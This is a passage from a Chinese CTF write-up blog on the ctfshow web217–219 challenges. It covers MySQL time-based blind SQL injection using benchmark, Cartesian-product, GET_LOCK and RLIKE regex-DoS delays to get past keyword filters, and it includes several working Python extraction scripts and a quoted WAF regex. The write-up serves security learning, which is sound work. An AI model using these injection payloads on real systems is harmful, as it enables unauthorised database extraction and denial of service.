class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b78d98e8-2199-4723-bf89-18fed148eb42.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxccb&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flagxccb),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),benchmark(2500000,sha(1)),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>观察之前的flag<br><code>ctfshow&#123;c059a105-e0f9-41b5-a49e-002ac179386a&#125;</code><br>从第九位开始七位，从17开始10位 从28开始12位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">44n3955e</span><br><span class="line">-cec3-</span><br><span class="line">4c84-</span><br><span class="line">bb3f-</span><br><span class="line">91f5caab1040&#125;</span><br><span class="line">ctfshow&#123;44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;</span><br><span class="line">44239p5d-cec3-4c84-bb3f-91f5caab1040fb</span><br><span class="line">4443955d</span><br></pre></td></tr></table></figure>
<p>这道太折磨人了做的要死了。 我操了 注三遍三个结果，破b脚本跑了3个小时，还是用大佬们的二分法跑吧，这个也太慢了。</p>
<h2 id="其他的时间盲注骚姿势"><a href="#其他的时间盲注骚姿势" class="headerlink" title="其他的时间盲注骚姿势"></a>其他的时间盲注骚姿势</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
</blockquote>
<h3 id="笛卡尔积盲注"><a href="#笛卡尔积盲注" class="headerlink" title="笛卡尔积盲注"></a>笛卡尔积盲注</h3><p>注入姿势</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| <span class="number">113101560</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.07</span> sec)</span><br><span class="line"> </span><br><span class="line"> mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| <span class="number">1</span>    | <span class="number">0</span>   |</span><br><span class="line">+------+-----+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.08</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>

<p>利用and短路运算规则进行时间盲注。</p>
<h3 id="GET-LOCK盲注"><a href="#GET-LOCK盲注" class="headerlink" title="GET_LOCK盲注"></a>GET_LOCK盲注</h3><p>get_lock函数官方文档中的介绍<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689289973207-90f19c56-353b-4128-8a5c-9b65198645bf.png" alt="ZZAQbT.md.png"><br>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。<br>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入<br>SESSION A</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">1</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>SESSION B</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">0</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">5.00</span> sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">2.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>同样的盲注利用手法。</p>
<h3 id="正则DOS-RLIKE注入"><a href="#正则DOS-RLIKE注入" class="headerlink" title="正则DOS RLIKE注入"></a>正则DOS RLIKE注入</h3><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的benchmark注入差不多的。<br>利用手法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+b&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| <span class="number">1</span>    |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+cd&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">3.83</span> sec)</span><br></pre></td></tr></table></figure>
<h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h3 id="笛卡尔乘积"><a href="#笛卡尔乘积" class="headerlink" title="笛卡尔乘积"></a>笛卡尔乘积</h3><p>benchmark也被禁用了，用笛卡尔积运算来达到延迟的目的<br>主要的语句是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B</span><br></pre></td></tr></table></figure>
<p>拼接到payload里面测试一下：<br>不够就一直加，加到有延迟为止。<br>就不一点点爆了，直接梭。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://f277bdb1-e417-43a9-a241-8a77c0cdaeff.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaac) from ctfshow_flagxc),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h2 id="Rlike"><a href="#Rlike" class="headerlink" title="Rlike"></a>Rlike</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">正则语法：</span><br><span class="line">. : 匹配任意单个字符</span><br><span class="line">* ： 匹配<span class="number">0</span>个或多个前一个得到的字符</span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br><span class="line"></span><br><span class="line">RPAD(<span class="built_in">str</span>,<span class="built_in">len</span>,padstr)</span><br><span class="line">用字符串 padstr对 <span class="built_in">str</span>进行右边填补直至它的长度达到 <span class="built_in">len</span>个字符长度，然后返回 <span class="built_in">str</span>。如果 <span class="built_in">str</span>的长度长于 <span class="built_in">len</span><span class="string">&#x27;，那么它将被截除到 len个字符。</span></span><br><span class="line"><span class="string">mysql&gt; SELECT RPAD(&#x27;</span>hi<span class="string">&#x27;,5,&#x27;</span>?<span class="string">&#x27;); -&gt; &#x27;</span>hi???<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">repeat(str,times)  复制字符串times次</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#x27;c&#x27;,( concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;),0)#</span></span><br><span class="line"><span class="comment">#求表payload = &quot;1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(i,j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end - start &lt; <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查询语句</span><br><span class="line">where <span class="built_in">id</span> = ($<span class="built_in">id</span>);</span><br><span class="line">//屏蔽危险分子</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/sleep|benchmark|rlike/i&#x27;</span>,$<span class="built_in">str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>同上题<br>直接跑就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://6c19b909-06f4-412b-ba28-581287b784fc.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxca&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from 